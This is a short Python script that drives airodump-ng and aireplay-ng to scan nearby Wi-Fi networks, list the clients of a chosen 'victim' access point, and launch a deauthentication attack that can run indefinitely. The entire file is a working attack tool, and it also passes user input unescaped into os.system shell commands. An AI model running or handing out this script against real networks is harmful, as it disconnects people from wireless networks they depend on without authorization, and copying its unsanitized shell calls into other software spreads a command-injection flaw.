import os,sys

def scan(interface):
    os.system("sudo airodump-ng " + interface)
    victim = input('Insert BSSID from wi-fi victim: ')
    channel = input('Insert Channel from wi-fi victim: ')
    getUsers(victim,channel,interface)

def deauth(victim,interface):
    times = input('How many times do you want to deauth? (0 - Infinite): ')
    os.system("sudo aireplay-ng -0 " + times + " -a " + victim + " " + interface + " --ignore-negative-one")

def getUsers(victim,channel,interface):
    os.system("sudo airodump-ng -d " + victim + " -c " + channel + " " + interface + " ")
    chosse = input('Start deauth attack : ')
    if chosse in ['yes','Yes','YES','Y','y']:
        deauth(victim,interface)
try:
    if(sys):
        scan(sys.argv[1])
except:
    print()